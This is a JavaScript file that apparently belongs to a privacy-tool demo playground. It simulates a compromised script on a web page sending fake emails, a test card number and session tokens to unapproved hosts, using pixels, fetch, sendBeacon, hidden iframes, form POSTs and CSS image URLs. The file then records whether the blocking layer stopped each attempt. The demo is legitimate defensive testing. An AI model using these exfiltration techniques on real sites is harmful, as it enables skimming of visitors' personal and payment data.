/**
 * Attack buttons. Each attack does one thing a compromised or careless script
 * could do. The runner collects the signals (violation events, airgap.export(),
 * the override hits, consent) and asks attribution.js for the outcome and, when
 * the signals support it, the layer that stopped it.
 *
 * Every request carries a unique `n` query parameter. That is how an attack
 * finds its own request in the violation list, the resource timing list, and
 * airgap.export().
 *
 * All values here are fake. The card number is a public test number.
 */
(function () {
  const ns = (self.AirgapPlayground = self.AirgapPlayground || {});
  const config = self.AIRGAP_DEMO_CONFIG;
  const { attribution } = ns;

  const STORE_ACCOUNT = 'store-4821';
  const ATTACKER_ACCOUNT = 'attacker-9921';
  const DATA = {
    email: 'visitor@example.com',
    card: '4242424242424242',
    token: 'sess_demo12345678',
  };
  const HOSTS = {
    unapproved: config.UNAPPROVED_HOST,
    unpkg: 'unpkg.com',
    analytics: config.ANALYTICS_HOST,
    ads: 'ads.linkedin.com',
    approved: 'cdn.jsdelivr.net',
  };
  const ASSET =
    'https://cdn.jsdelivr.net/gh/transcend-io/examples@main/airgap-security-demo/assets/pixel.png';
  const URLS = {
    pixel: config.UNAPPROVED_PIXEL_URL,
    data: config.UNAPPROVED_FETCH_URL,
    script: 'https://unpkg.com/dayjs@1.11.13/dayjs.min.js',
    socket:
      'wss://raw.githubusercontent.com/transcend-io/examples/main/LICENSE',
    analytics: 'https://www.google-analytics.com/g/collect',
    ads: 'https://ads.linkedin.com/collect',
    asset: ASSET,
    link: 'https://cdn.jsdelivr.net/gh/transcend-io/examples@main/LICENSE',
  };

  const violations = [];
  let counter = 0;

  /** @param {string} url */
  function hostOf(url) {
    try {
      return new URL(url, location.href).host;
    } catch (error) {
      return String(url);
    }
  }
  document.addEventListener('securitypolicyviolation', (event) => {
    violations.push({ host: hostOf(event.blockedURI), at: Date.now() });
  });

  const sleep = (ms) =>
    new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
  const timeout = () => sleep(config.STALL_TIMEOUT_MS).then(() => 'timeout');

  /** @returns {object|null} airgap.export() or null. */
  function readExport() {
    const { airgap } = self;
    if (!airgap || typeof airgap.export !== 'function') return null;
    try {
      return airgap.export();
    } catch (error) {
      return null;
    }
  }

  /**
   * @param {string} purpose A purpose name.
   * @returns {boolean} True only when getConsent() says the purpose is on.
   */
  function consentFor(purpose) {
    const { airgap } = self;
    if (!airgap || typeof airgap.getConsent !== 'function') return false;
    try {
      const details = airgap.getConsent();
      return Boolean(details && details.purposes && details.purposes[purpose]);
    } catch (error) {
      return false;
    }
  }

  const listHas = (items, nonce) =>
    (items || []).some(
      (item) => String((item && item.url) || '').indexOf(`n=${nonce}`) !== -1,
    );

  /**
   * @param {string} baseUrl
   * @param {object} params
   */
  function start(baseUrl, params) {
    counter += 1;
    const nonce = `${Date.now().toString(36)}${counter}`;
    const query = new URLSearchParams(params || {});
    query.set('n', nonce);
    return {
      nonce,
      url: `${baseUrl}?${query.toString()}`,
      host: hostOf(baseUrl),
      since: violations.length,
      startedAt: Date.now(),
    };
  }

  /**
   * Resolve a request promise, or give up after the stall timeout.
   *
   * @param {Promise<string>} promise
   */
  async function raceTimeout(promise) {
    const result = await Promise.race([promise, timeout()]);
    if (result === 'error') await sleep(50);
    return result;
  }

  /**
   * Watch the resource timing list for the request. Stop at the first
   * violation for the host, or at the timeout.
   *
   * @param {object} context
   */
  async function watchResource(context) {
    while (Date.now() - context.startedAt < config.STALL_TIMEOUT_MS) {
      const fetched = performance
        .getEntriesByType('resource')
        .some((entry) => entry.name.indexOf(`n=${context.nonce}`) !== -1);
      const refused = violations
        .slice(context.since)
        .some((violation) => violation.host === context.host);
      if (fetched) return 'ok';
      if (refused) return 'timeout';
      await sleep(100);
    }
    return 'timeout';
  }

  /**
   * Run an inline script that a compromised tag would add.
   *
   * @param {string} code
   * @param {string} callbackName
   */
  function injectInline(code, callbackName) {
    return new Promise((resolve) => {
      self[callbackName] = resolve;
      const injected = document.createElement('script');
      injected.textContent = code;
      document.head.appendChild(injected);
      injected.remove();
    });
  }

  /**
   * Resolves "ok" when the frame reached a cross-origin page, and "stayed"
   * when it is still same-origin (about:blank).
   *
   * @param {HTMLIFrameElement} frame
   * @returns {Promise<string>}
   */
  function frameLoaded(frame) {
    return new Promise((resolve) => {
      frame.addEventListener('load', () => {
        try {
          void frame.contentWindow.location.href;
          resolve('stayed');
        } catch (error) {
          resolve('ok');
        }
      });
    });
  }

  /**
   * Make a fresh visible frame in the page, so the visitor stays on the page.
   *
   * @param {string} name
   */
  function freshFrame(name) {
    const old = document.getElementById('nav-frame');
    const frame = document.createElement('iframe');
    frame.id = 'nav-frame';
    frame.name = name;
    frame.title = 'Test frame';
    old.replaceWith(frame);
    return frame;
  }

  const fetchNoCors = (url, init) =>
    fetch(url, Object.assign({ mode: 'no-cors' }, init)).then(
      () => 'ok',
      () => 'error',
    );

  /**
   * Click a link that opens in a fresh test frame.
   *
   * @param {object} context
   * @param {string} prefix
   */
  async function clickLink(context, prefix) {
    const frame = freshFrame(`${prefix}-${context.nonce}`);
    const link = document.createElement('a');
    link.setAttribute('href', context.url);
    link.target = frame.name;
    link.hidden = true;
    document.body.appendChild(link);
    const loaded = frameLoaded(frame);
    link.click();
    const hrefAfterClick = link.href;
    const result = await Promise.race([loaded, timeout()]);
    link.remove();
    return { transport: result === 'ok' ? 'ok' : 'timeout', hrefAfterClick };
  }

  /** The attacks, in display order. `run` returns { context, transport, extra? }. */
  const ATTACKS = [
    {
      id: 'pixel',
      title: 'Tracking pixel',
      what: 'Loads an image from an unapproved host.',
      kind: 'request',
      host: HOSTS.unapproved,
      async run() {
        const context = start(URLS.pixel, { stolen: DATA.email });
        const transport = await raceTimeout(
          new Promise((resolve) => {
            const img = new Image();
            img.onload = () => resolve('ok');
            img.onerror = () => resolve('error');
            img.src = context.url;
          }),
        );
        return { context, transport };
      },
    },
    {
      id: 'fetch',
      title: 'fetch from an injected script',
      what: 'An inline script calls fetch on an unapproved host with the email in the URL.',
      kind: 'request',
      host: HOSTS.unapproved,
      async run() {
        const context = start(URLS.data, { stolen: DATA.email });
        const transport = await raceTimeout(
          injectInline(
            `fetch(${JSON.stringify(context.url)})` +
              ".then(function(){__playgroundFetch('ok')})" +
              ".catch(function(){__playgroundFetch('error')})",
            '__playgroundFetch',
          ),
        );
        return { context, transport };
      },
    },
    {
      id: 'beacon',
      title: 'sendBeacon',
      what: 'Calls navigator.sendBeacon on an unapproved host with the card and token.',
      kind: 'request',
      host: HOSTS.unapproved,
      async run() {
        const context = start(URLS.data, {});
        const queued = navigator.sendBeacon(
          context.url,
          JSON.stringify({ card: DATA.card, token: DATA.token }),
        );
        if (!queued) return { context, transport: 'error' };
        return { context, transport: await watchResource(context) };
      },
    },
    {
      id: 'xhr',
      title: 'XMLHttpRequest',
      what: 'Sends an XMLHttpRequest to an unapproved host.',
      kind: 'request',
      host: HOSTS.unapproved,
      async run() {
        const context = start(URLS.data, { stolen: DATA.email });
        const transport = await raceTimeout(
          new Promise((resolve) => {
            const xhr = new XMLHttpRequest();
            xhr.onload = () => resolve('ok');
            xhr.onerror = () => resolve('error');
            xhr.open('GET', context.url);
            xhr.send();
          }),
        );
        return { context, transport };
      },
    },
    {
      id: 'websocket',
      title: 'WebSocket',
      what: 'Opens a WebSocket to an unapproved host. The static host refuses the handshake, so an unprotected page shows "error", not "allowed".',
      kind: 'request',
      host: HOSTS.unapproved,
      async run() {
        const context = start(URLS.socket, {});
        let socket = null;
        const transport = await raceTimeout(
          new Promise((resolve) => {
            try {
              socket = new WebSocket(context.url);
              socket.onopen = () => resolve('ok');
              socket.onerror = () => resolve('error');
              socket.onclose = () => resolve('error');
            } catch (error) {
              resolve('error');
            }
          }),
        );
        if (socket) socket.close();
        return { context, transport };
      },
    },
    {
      id: 'script',
      title: 'Injected script tag',
      what: 'Adds a script element that loads code from an unapproved host.',
      kind: 'request',
      host: HOSTS.unpkg,
      async run() {
        const context = start(URLS.script, {});
        let script = null;
        const transport = await raceTimeout(
          new Promise((resolve) => {
            script = document.createElement('script');
            script.onload = () => resolve('ok');
            script.onerror = () => resolve('error');
            script.setAttribute('src', context.url);
            document.head.appendChild(script);
          }),
        );
        if (script) script.remove();
        return { context, transport };
      },
    },
    {
      id: 'iframe',
      title: 'Hidden iframe',
      what: 'Adds an iframe that loads a page from an unapproved host.',
      kind: 'request',
      host: HOSTS.unapproved,
      async run() {
        const context = start(URLS.data, { stolen: DATA.email });
        const frame = document.createElement('iframe');
        frame.hidden = true;
        const transport = await raceTimeout(
          new Promise((resolve) => {
            frame.addEventListener('load', () => resolve('ok'));
            frame.setAttribute('src', context.url);
            document.body.appendChild(frame);
          }),
        );
        frame.remove();
        return { context, transport };
      },
    },
    {
      id: 'form-post',
      title: 'Form POST',
      what: 'Submits a hidden form with the card to an unapproved host.',
      kind: 'request',
      host: HOSTS.unapproved,
      async run() {
        const context = start(URLS.data, {});
        const frame = document.createElement('iframe');
        frame.hidden = true;
        frame.name = `post-${context.nonce}`;
        document.body.appendChild(frame);
        const form = document.createElement('form');
        form.method = 'POST';
        form.setAttribute('action', context.url);
        form.target = frame.name;
        form.hidden = true;
        ['email', 'card'].forEach((name) => {
          const input = document.createElement('input');
          input.name = name;
          input.value = DATA[name];
          form.appendChild(input);
        });
        document.body.appendChild(form);
        const transport = await raceTimeout(
          new Promise((resolve) => {
            frame.addEventListener('load', () => resolve('ok'));
            form.submit();
          }),
        );
        form.remove();
        frame.remove();
        return { context, transport };
      },
    },
    {
      id: 'stylesheet',
      title: 'Hidden request in a stylesheet',
      what: 'Adds a style rule whose image URL carries the email.',
      kind: 'request',
      host: HOSTS.unapproved,
      async run() {
        const context = start(URLS.pixel, { stolen: DATA.email });
        const className = `injected-skim-${context.nonce}`;
        const style = document.createElement('style');
        style.textContent = `.${className}{display:block;width:1px;height:1px;background-image:url("${context.url}")}`;
        const probe = document.createElement('div');
        probe.className = className;
        document.head.appendChild(style);
        document.body.appendChild(probe);
        const transport = await watchResource(context);
        style.remove();
        probe.remove();
        return { context, transport };
      },
    },
    {
      id: 'location',
      title: 'Set location',
      what: 'Sets location (in a test frame) to an unapproved host with the card in the URL.',
      kind: 'navigation',
      host: HOSTS.unapproved,
      async run() {
        const context = start(URLS.data, {
          email: DATA.email,
          card: DATA.card,
        });
        const frame = freshFrame(`loc-${context.nonce}`);
        const loaded = frameLoaded(frame);
        frame.contentWindow.location.href = context.url;
        const result = await Promise.race([loaded, timeout()]);
        return { context, transport: result === 'ok' ? 'ok' : 'timeout' };
      },
    },
    {
      id: 'link-click',
      title: 'Link click',
      what: 'Clicks a link to an unapproved host (the link opens in a test frame).',
      kind: 'navigation',
      host: HOSTS.unapproved,
      async run() {
        const context = start(URLS.data, { email: DATA.email });
        const { transport } = await clickLink(context, 'link');
        return { context, transport };
      },
    },
    {
      id: 'window-open',
      title: 'window.open',
      what: 'Opens a popup to an unapproved host. Browsers may block a popup that no click started.',
      kind: 'navigation',
      host: HOSTS.unapproved,
      async run() {
        const context = start(URLS.data, { email: DATA.email });
        const popup = window.open(context.url);
        if (!popup) {
          return {
            context,
            transport: 'error',
            extra:
              'window.open returned null. The browser or Airgap refused the popup.',
          };
        }
        const transport = await Promise.race([
          (async () => {
            while (Date.now() - context.startedAt < config.STALL_TIMEOUT_MS) {
              try {
                if (popup.location.href !== 'about:blank') return 'stayed';
              } catch (error) {
                return 'ok';
              }
              await sleep(100);
            }
            return 'timeout';
          })(),
          timeout(),
        ]);
        popup.close();
        return { context, transport: transport === 'ok' ? 'ok' : 'timeout' };
      },
    },
    {
      id: 'cookie',
      title: 'Cookie write',
      what: 'Sets a cookie that no purpose lists.',
      kind: 'cookie',
      host: location.host,
      async run() {
        const context = start(location.href.split('?')[0], {});
        const name = `playground_${context.nonce}`;
        document.cookie = `${name}=1; path=/; SameSite=Lax`;
        await sleep(400);
        const present = document.cookie.indexOf(`${name}=`) !== -1;
        document.cookie = `${name}=; path=/; max-age=0`;
        return {
          context,
          transport: present ? 'cookie-set' : 'cookie-missing',
        };
      },
    },
    {
      id: 'analytics-store',
      title: 'Analytics hit, store account',
      what: `Calls the approved analytics host with account ${STORE_ACCOUNT}. Consent decides.`,
      kind: 'request',
      host: HOSTS.analytics,
      purpose: 'Analytics',
      async run() {
        const context = start(URLS.analytics, { account: STORE_ACCOUNT });
        return {
          context,
          transport: await raceTimeout(fetchNoCors(context.url)),
        };
      },
    },
    {
      id: 'analytics-attacker',
      title: 'Analytics hit, attacker account',
      what: `Calls the same approved host with account ${ATTACKER_ACCOUNT}. Only an override can tell the two apart.`,
      kind: 'request',
      host: HOSTS.analytics,
      purpose: 'Analytics',
      async run() {
        const context = start(URLS.analytics, { account: ATTACKER_ACCOUNT });
        return {
          context,
          transport: await raceTimeout(fetchNoCors(context.url)),
        };
      },
    },
    {
      id: 'ad-pixel',
      title: 'Ad request',
      what: 'Calls an advertising host. Consent for Advertising decides.',
      kind: 'request',
      host: HOSTS.ads,
      purpose: 'Advertising',
      async run() {
        const context = start(URLS.ads, { pid: 'demo' });
        return {
          context,
          transport: await raceTimeout(fetchNoCors(context.url)),
        };
      },
    },
    {
      id: 'ad-pixel-health',
      title: 'Ad pixel with health data',
      what: 'Calls the advertising host with a health condition in the URL.',
      kind: 'request',
      host: HOSTS.ads,
      purpose: 'Advertising',
      async run() {
        const context = start(URLS.ads, { pid: 'demo', condition: 'diabetes' });
        return {
          context,
          transport: await raceTimeout(fetchNoCors(context.url)),
        };
      },
    },
    {
      id: 'approved-email-post',
      title: 'Email to an approved third party',
      what: 'POSTs the email to an approved third-party host.',
      kind: 'request',
      host: HOSTS.approved,
      purpose: 'Essential',
      async run() {
        const context = start(URLS.asset, {});
        const transport = await raceTimeout(
          fetchNoCors(context.url, {
            method: 'POST',
            body: JSON.stringify({ email: DATA.email }),
          }),
        );
        return { context, transport };
      },
    },
    {
      id: 'approved-card-post',
      title: 'Card to an approved third party',
      what: 'POSTs the card number and a session token to an approved third-party host.',
      kind: 'request',
      host: HOSTS.approved,
      purpose: 'Essential',
      async run() {
        const context = start(URLS.asset, {});
        const transport = await raceTimeout(
          fetchNoCors(context.url, {
            method: 'POST',
            body: JSON.stringify({ card: DATA.card, token: DATA.token }),
          }),
        );
        return { context, transport };
      },
    },
    {
      id: 'user-image',
      title: 'User-supplied image',
      what: 'Loads an image from another host and reports the crossorigin attribute the image ends up with.',
      kind: 'request',
      host: HOSTS.approved,
      purpose: 'Essential',
      async run() {
        const context = start(URLS.asset, {});
        let image = null;
        const transport = await raceTimeout(
          new Promise((resolve) => {
            image = new Image();
            image.onload = () => resolve('ok');
            image.onerror = () => resolve('error');
            image.src = context.url;
          }),
        );
        const attribute = image && image.getAttribute('crossorigin');
        return {
          context,
          transport,
          extra: `crossorigin attribute on the image: ${attribute || 'none'}.`,
        };
      },
    },
    {
      id: 'link-scrub',
      title: 'Link with personal data',
      what: 'Clicks a link to an approved host with the email and a token in the URL. Reports the link target at click time.',
      kind: 'navigation',
      host: HOSTS.approved,
      purpose: 'Essential',
      async run() {
        const context = start(URLS.link, {
          email: DATA.email,
          token: DATA.token,
        });
        const { transport, hrefAfterClick } = await clickLink(context, 'scrub');
        const after = new URL(hrefAfterClick);
        const carried = ['email', 'token'].filter((name) =>
          after.searchParams.has(name),
        );
        return {
          context,
          transport,
          extra: carried.length
            ? `The link carried: ${carried.join(', ')}.`
            : 'The link no longer carried email or token.',
        };
      },
    },
  ];

  /**
   * Run one attack and attribute the result.
   *
   * @param {object} attack An entry of ATTACKS.
   * @returns {Promise<object>} A result row.
   */
  async function runAttack(attack) {
    const { state } = ns;
    const { context, transport, extra } = await attack.run();
    const exported = readExport() || {};
    const hit =
      ns.recipes.hits
        .filter(
          (entry) =>
            entry.at >= context.startedAt &&
            entry.url.indexOf(`n=${context.nonce}`) !== -1,
        )
        .pop() || null;
    const result = attribution.attribute({
      kind: attack.kind,
      transport,
      violation: violations
        .slice(context.since)
        .some((entry) => entry.host === context.host),
      heldByAirgap: listHas(exported.requests, context.nonce),
      sentByAirgap: listHas(exported.sentRequests, context.nonce),
      overrideHit: hit,
      settings: state.settings,
      hostPurpose:
        attack.purpose && attack.purpose !== 'Essential'
          ? attack.purpose
          : null,
      hostKnown: Boolean(attack.purpose),
      consented: attack.purpose ? consentFor(attack.purpose) : true,
      customBundle: state.customBundle,
      airgapLoaded: state.status === 'ready',
      host: context.host,
      seconds: config.STALL_TIMEOUT_MS / 1000,
    });
    return {
      id: attack.id,
      title: attack.title,
      host: attack.host,
      outcome: result.outcome,
      layer: result.layer,
      detail: extra ? `${result.detail} ${extra}` : result.detail,
    };
  }

  ns.attacks = {
    ATTACKS,
    DATA,
    STORE_ACCOUNT,
    ATTACKER_ACCOUNT,
    consentFor,
    readExport,
    runAttack,
    sleep,
  };
})();
